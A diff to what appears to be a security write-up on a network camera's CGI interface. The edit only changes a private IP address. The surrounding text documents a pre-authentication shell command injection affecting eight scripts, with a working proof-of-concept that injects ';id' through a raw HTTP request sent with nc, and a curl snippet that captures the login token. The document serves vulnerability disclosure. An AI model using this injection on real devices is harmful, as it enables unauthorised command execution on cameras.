@@ -139,7 +139,7 @@ it evaluates the query string as shell code **before the token check runs**. `he
 at the top of `webui`, `system`, `settings`, `settings_submit.sh`, `events`, `video`,
 `del_video.sh` and `pwd_change`, so all eight are affected.
 
-Verified live against 10.0.10.20 (read-only commands only):
+Verified live against 192.168.1.20 (read-only commands only):
 
 ```console
 $ printf 'GET /cgi-bin/webui?a=1;id HTTP/1.0\r\nHost: x\r\n\r\n' | nc <ip> 80
@@ -423,7 +423,7 @@ Verified with `netstat -ltnp` on the camera:
 Log in and keep the token, using only the tools a normal box has:
 
 ```sh
-CAM=10.0.10.20
+CAM=192.168.1.20
 TOKEN=$(curl -s "http://$CAM/cgi-bin/login_validate.sh?p=webui" \
         | sed -n 's/.*token=\([A-Za-z0-9]*\).*/\1/p')
 echo "$TOKEN"
